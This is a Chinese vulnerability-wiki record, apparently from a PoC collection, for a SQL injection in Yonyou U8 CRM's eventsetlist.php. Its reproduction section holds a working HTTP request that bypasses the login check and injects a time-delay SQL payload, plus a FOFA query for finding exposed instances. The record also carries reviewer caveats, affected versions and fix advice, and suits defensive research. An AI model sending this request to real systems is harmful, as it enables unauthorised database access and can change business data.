---
source: "SourByte05/Vulnerability-Wiki-PoC"
title: "用友U8 CRM eventsetlist eventID SQL 注入"
product: "用友U8 CRM"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "列六版本；SQL Server"
prerequisites: "DontCheckLogin及bgsesstimeout"
side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
review_date: "2026-10-02"
source_url: "https://github.com/SourByte05/Vulnerability-Wiki-PoC"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/ERP%E4%BC%81%E4%B8%9A/%E7%94%A8%E5%8F%8BU8/%E7%94%A8%E5%8F%8BU8%20CRM%20eventseteventsetlist.php%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md"
fofa: "title=\"用友U8CRM\""
fofa_unverified: "title="
id: "vw-bb7ca6aed4ac72b821821882"
entity_id: "ve-bb7ca6aed4ac72b821821882"
schema_version: "1"
---

# 用友U8 CRM eventsetlist eventID SQL 注入

## 条目说明

- 对象与具体问题：用友U8 CRM；eventsetlist eventID SQLi
- 版本、配置及部署条件：列六版本；SQL Server
- 认证与权限前提：DontCheckLogin及bgsesstimeout
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- action=stop&stopFlag=1可能改变事件业务状态，不应列为无副作用检测
- 3秒延时需基线对照；版本/在野声明缺出处
- 标题补eventset/斜杠，缺具体修复

## 操作风险

现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。

## 技术资料与来源记录

## 漏洞描述

用友U8 CRM eventset/eventsetlist.php SQL注入漏洞，未授权攻击者可进行任意数据库查询操作，甚至可能获取服务器权限。

## 影响版本

V18, V16.5, V16.1, V16.0, V15.1, V13

## **漏洞状态**

| 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
|------|-------|-------|------|
| 原文提供部分细节 | 见技术资料 | 未独立核验 | 待来源核实 |

### 风险等级

| 维度 | 评价 |
|----|----|
| 威胁等级 | 高危 |
| 影响面 | 广 |
| 攻击者价值 | 高 |
| 利用难度 | 低 |

## 漏洞复现

FOFA：title="用友U8CRM"

POC/EXP：

```http
GET /eventset/eventsetlist.php?DontCheckLogin=1&action=stop&stopFlag=1&eventID=1;WAITFOR+DELAY+'0:0:3'-- HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=bgsesstimeout-;
Connection: close
```

![image-20250311170138032](./.resource/用友U8CRMeventseteventsetlist.phpSQL注入漏洞/media/image-20250311170138032.png)


## 漏洞修复

关闭互联网暴露面或接口设置访问权限

升级至安全版本


---

> 来源：SourByte05/Vulnerability-Wiki-PoC（https://github.com/SourByte05/Vulnerability-Wiki-PoC）
